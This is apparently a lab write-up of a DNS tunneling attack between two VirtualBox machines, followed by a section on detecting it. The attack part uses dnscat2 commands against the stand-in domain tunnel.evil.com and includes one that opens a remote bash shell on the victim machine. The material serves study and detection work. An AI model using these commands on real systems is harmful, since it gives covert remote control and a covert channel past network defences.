Before attacking we need to setup the vm ip's so that it can simulate a remote attack.
The attacker will set on `bridged` adapter and vicitim will be using `nat-network`. We need to enable port forwarding on the network that the vicitim uses.

![image](https://github.com/user-attachments/assets/60cc624f-7693-4609-ad4d-7bbc6deed18e)

## Attack
Inorder to do dns tunneling we will use help of the tool dnscat2
On Attacker machine we will install the `server` package of the tool

```bash
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server
sudo gem install bundler
bundle install
```
On the victim machine we will install the `client` package

```bash
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/client
make
```

Now from the attacker side we will launch the attack

```
sudo ruby ./dnscat2.rb tunnel.evil.com --secret mysecret
```
Now to connect from the vicitm

```
./dnscat --secret=mysecret --dns server=172.17.128.29:domain=tunnel.evil.com 
```

![image](https://github.com/user-attachments/assets/cc4f3cb8-abbb-43c1-9e32-e92c68a0351a)

The connection has been successfully established by dnscat2

As we can seee the ubuntu machine is at number `1` so by using window command we can enter into that device

```bash
window -i 1
```

![image](https://github.com/user-attachments/assets/3ebb3d4d-db59-420b-bd14-cbae7ee4508e)


now we can try pinging the victim pc using `ping` command

![image](https://github.com/user-attachments/assets/c9a9b47d-59f1-44d4-aba1-7f6f2d6988e2)

ping request was shown in the victim screen 

![image](https://github.com/user-attachments/assets/d41bc32a-1053-47ac-9d1f-457ff73e9003)

by using `help` command we can see different commands that it support

We will try running commands on the victim through this shell

Trying the exec commands from the tool causes the session to crash sometimes so instead we will change the dnscat command used in the vicitim side.

After exiting the tool on victim and Attacker run this new command on victim and start the server on the attacker

```bash
./dnscat --secret=mysecret --dns server=172.17.128.29:domain=tunnel.evil.com --exec=/bin/bash
```
Here we are giving the shell as a parameter in the command itself

![image](https://github.com/user-attachments/assets/92da333c-fc0b-492a-afec-cb915430004c)

Now we can run commands on the victim machine

![image](https://github.com/user-attachments/assets/5ab6a7ed-60dd-4808-9342-ed4bfb8c5388)

## Detection

DNS tunneling could be detected using 

- **Suspicious Long DNS Query**
  - Detects encoded subdomains (e.g., Base64/Base32).
  - Typically used to carry data in tunneling tools 

- **High Volume of DNS TXT Requests**
  - Flags excessive usage of TXT records.
  - Commonly abused by tools to send/receive data through DNS responses.

- **Known Tunneling Domains**
  - Matches DNS requests to known or attacker-controlled domains 
  - Useful for detecting internal testing or known Indicators of Compromise (IOCs).

- **NULL Record Queries**
  - Alerts on DNS queries using the rarely-used `NULL` type.
  - This type is considered obsolete and is a red flag in most environments.
 
Suricata by default has dns null record query detecton rule on the `Emerging Threats (ET) Open Rules` package. So we dont need to add a custom rule to detect the attack

![image](https://github.com/user-attachments/assets/7c338d7b-9536-47c3-9629-f3878f33a1dd)

Because VirtualBox port forwarding was used. The victim sends DNS packets to the host IP, which forwards them to the attacker. From the victim’s and Suricata’s perspective, the destination is still the host.
